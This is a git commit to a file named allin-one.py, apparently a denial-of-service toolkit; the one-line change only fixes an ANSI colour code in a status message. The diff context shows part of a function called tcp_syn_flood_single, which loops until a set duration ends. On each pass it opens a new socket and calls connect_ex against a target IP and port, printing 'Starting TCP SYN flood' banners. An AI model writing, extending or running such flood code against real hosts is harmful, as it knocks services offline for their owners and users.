f18084754a7eadae7884d2d0dc46b066d54ea778
termul488-ai <termul488@gmail.com>
2026-01-09 14:42:26 +0700

    Update allin-one.py

--- allin-one.py
+++ allin-one.py
@@ -80,7 +80,7 @@ def tcp_syn_flood_single(ip, port, duration):
         while time.time() < end_time:
             time.sleep(0.2)
             print("\033[48;5;1mStarting TCP SYN flood 0ne-Threads \033[97m" +str(ip)+ " \033[33m0k..!\033[0m")
-            print("\033[91m Starting UDP TCP SYN flood 0ne-Threads \033[32m" +str(packet_size)+ " \033[38;5;5mm0k...!\033[0m")
+            print("\033[91m Starting UDP TCP SYN flood 0ne-Threads \033[32m" +str(packet_size)+ " \033[38;5;5m0k...!\033[0m")
             sock.connect_ex((ip, port))  # SYN flood doesn't complete handshake
             packet_count += 1
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # New socket each time
